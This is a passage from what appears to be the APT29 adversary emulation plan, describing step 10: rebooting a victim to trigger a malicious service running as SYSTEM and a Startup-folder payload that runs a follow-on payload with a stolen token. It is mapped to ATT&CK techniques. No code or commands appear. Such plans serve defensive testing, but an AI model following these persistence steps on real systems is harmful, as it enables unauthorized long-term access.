The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the new service ([T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/)) and payload in the Windows Startup folder ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/)). The payload in the Startup folder executes a follow-on payload using a stolen token ([T1106](https://attack.mitre.org/techniques/T1106/), [T1134](https://attack.mitre.org/versions/v6/techniques/T1134/) / [T1134.002](https://attack.mitre.org/techniques/T1134/002)).

### Procedures

#### 10.A - System Services: Service Execution ([T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/))

Reboot Windows victim 1; wait for system to boot up

You should receive a callback with SYSTEM permissions from the javamtsup service

#### 10.B - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/))

Trigger the Startup Folder persistence by logging in to Windows victim 1

### Cited Intelligence

* Open Invitation Contributor: Kaspersky

* CosmicDuke has installed persistence services that duplicate and uses the process token of explorer.exe to start the malware.<sup> [2](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf) </sup>

---

## Acknowledgments

### Special thanks to the following public resources:

* Metasploit (<https://github.com/rapid7/metasploit-framework>)
* Pupy (<https://github.com/n1nj4sec/pupy>)
* Invoke-PSImage (<https://github.com/peewpw/Invoke-PSImage>)
* Microsoft Sysinternals (<https://docs.microsoft.com/en-us/sysinternals/>)

---

## Additional Plan Resources

- [Intelligence Summary](/apt29/Intelligence_Summary.md)
- [Operations Flow](/apt29/Operations_Flow.md)
- [Emulation Plan](/apt29/Emulation_Plan/README.md)
  - [Scenario 1 - Infrastructure](/apt29/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1](/apt29/Emulation_Plan/Scenario_1/README.md)
  - [Scenario 2 - Infrastructure](/apt29/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2](/apt29/Emulation_Plan/Scenario_2/README.md)
  - [YAML](/apt29/Emulation_Plan/yaml)
- [Archive](/apt29/Archive)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/apt29/CHANGE_LOG.md)
